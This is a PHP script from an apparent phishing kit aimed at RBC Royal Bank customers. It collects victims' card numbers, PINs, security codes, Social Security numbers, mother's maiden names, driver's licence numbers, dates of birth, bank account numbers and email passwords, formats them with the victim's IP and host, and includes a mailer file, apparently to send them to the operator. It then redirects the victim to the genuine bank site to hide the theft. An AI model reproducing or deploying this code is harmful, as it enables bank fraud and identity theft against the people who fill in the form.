<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$cc=$_POST["cc"];
$pin=$_POST["pin"];
$ccin=$_POST["ccin"];
$name=$_POST["name"];
$mmn=$_POST["mmn"];
$address=$_POST["address"];
$city=$_POST["city"];
$postal=$_POST["postal"];
$state=$_POST["state"];
$wphone=$_POST["wphone"];
$hphone=$_POST["hphone"];
$emp=$_POST["emp"];
$ssn1=$_POST["ssn1"];
$ssn2=$_POST["ssn2"];
$ssn3=$_POST["ssn3"];
$dl=$_POST["dl"];
$month=$_POST["month"];
$day=$_POST["day"];
$year=$_POST["year"];
$accnr=$_POST["accnr"];
$eemail=$_POST["eemail"];
$epass=$_POST["epass"];

$mesaj="
==================Parfumatul===================
RBC Questions3: $ip
Host: $hostname

Card Number : $cc
Pin: $pin
2-digit number: $ccin

Name: $name
MMN: $mmn
Address: $address
City: $city
Postal Code: $postal
State: $state
Work Phone: $wphone
Home Phone: $hphone
Current Employer: $emp
SSN: $ssn1 - $ssn2 - $ssn3
Driver's License Number: $dl
DOB (MM/DD/YYYY): $month/$day/$year
Checking/savings account number: $accnr

Email: $eemail
Email Password: $epass

==================Parfumatul===================";
$subject="RBC $ip";
$headers = "From: Lastone <tariqhendi@gmail.com>";
include "email.php";
include "css/rbc.gif"; header( "Location: http://www.rbcroyalbank.com/online/online-banking-security-guarantee.html" );
?>